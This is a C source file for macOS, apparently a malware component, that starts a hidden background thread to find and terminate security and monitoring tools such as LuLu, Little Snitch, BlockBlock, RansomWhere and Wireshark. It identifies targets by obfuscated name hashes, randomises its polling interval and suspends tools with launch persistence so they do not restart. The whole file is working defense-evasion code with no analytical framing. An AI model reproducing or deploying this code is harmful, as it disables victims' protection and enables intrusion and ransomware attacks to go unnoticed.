#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libproc.h>
#include <limits.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <pthread.h>
#include <ctype.h>
#include <time.h>

// DJB2 hash for process name matching
static uint32_t hash_str(const char *str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++)) {
        c = tolower(c);
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Hashes of tools to terminate
static const uint32_t target_hashes[] = {
    0x7c9a4887,  // lulu
    0xcb6c1360,  // oversight
    0x2a4852f1,  // knockknock
    0x1c4c617b,  // blockblock
    0x192a2fce,  // reikey
    0x6d257830,  // ransomwhere
    0xe83493e9,  // taskexplorer
    0x6e4495bc,  // littlesnitch
    0x3a592cf5,  // wireshark
    0x97ddb30d,  // netiquette
    0xfc503acc,  // processmonitor
    0
};

// Check if process has LaunchDaemon/Agent 
static int has_persistence(const char *name) {
    char buf[PATH_MAX];
    struct stat st;
    
    snprintf(buf, sizeof(buf), "/Library/LaunchDaemons/%s.plist", name);
    if (stat(buf, &st) == 0) return 1;
    
    const char *home = getenv("HOME");
    if (home) {
        snprintf(buf, sizeof(buf), "%s/Library/LaunchAgents/%s.plist", home, name);
        if (stat(buf, &st) == 0) return 1;
    }
    
    return 0;
}

// Extract process name from full path and normalize (lowercase, strip .app)
static void extract_name(const char *path, char *out, size_t out_size) {
    const char *slash = strrchr(path, '/');
    const char *name = slash ? slash + 1 : path;
    
    size_t i;
    for (i = 0; i < out_size - 1 && name[i]; i++) {
        out[i] = tolower(name[i]);
    }
    out[i] = '\0';
    
    char *dot = strstr(out, ".app");
    if (dot) *dot = '\0';
}

// Is this hash in our target list?
static int is_target(uint32_t hash) {
    for (int i = 0; target_hashes[i]; i++) {
        if (hash == target_hashes[i]) return 1;
    }
    return 0;
}

/**
 * If process has LaunchDaemon/Agent, just suspend it (SIGSTOP).
 * Killing would trigger auto-restart. Otherwise escalate TERM > KILL.
 */
static void terminate_proc(pid_t pid, const char *name) {
    if (has_persistence(name)) {
        kill(pid, SIGSTOP);
        return;
    }
    
    if (kill(pid, SIGTERM) == 0) {
        usleep(100000);
        kill(pid, SIGKILL);
    }
}

/**
 * Queries kernel for all running PIDs, gets their paths, extracts names,
 * hashes them, and terminates matches. No fs checks.
 */
void hunt_procs(void) {
    int bytes = proc_listpids(PROC_ALL_PIDS, 0, NULL, 0);
    if (bytes <= 0) return;
    
    pid_t *pids = malloc(bytes);
    if (!pids) return;
    
    int filled = proc_listpids(PROC_ALL_PIDS, 0, pids, bytes);
    int count = filled / sizeof(pid_t);
    pid_t self = getpid();
    
    for (int i = 0; i < count; i++) {
        if (!pids[i] || pids[i] == self) continue;
        
        char path[PROC_PIDPATHINFO_MAXSIZE];
        if (proc_pidpath(pids[i], path, sizeof(path)) > 0) {
            char name[256];
            extract_name(path, name, sizeof(name));
            
            uint32_t hash = hash_str(name);
            if (is_target(hash)) {
                terminate_proc(pids[i], name);
            }
        }
    }
    
    free(pids);
}

// Background monitoring loop with randomized timing
static void *monitor(void *arg) {
    (void)arg;
    
    srand(getpid() ^ time(NULL));
    
    while (1) {
        sleep(3 + (rand() % 6));  // 3-8 seconds
        hunt_procs();
    }
    
    return NULL;
}

void Spawn(void) {
    pthread_t tid;
    pthread_attr_t attr;
    
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    
    pthread_create(&tid, &attr, monitor, NULL);
    pthread_attr_destroy(&attr);
}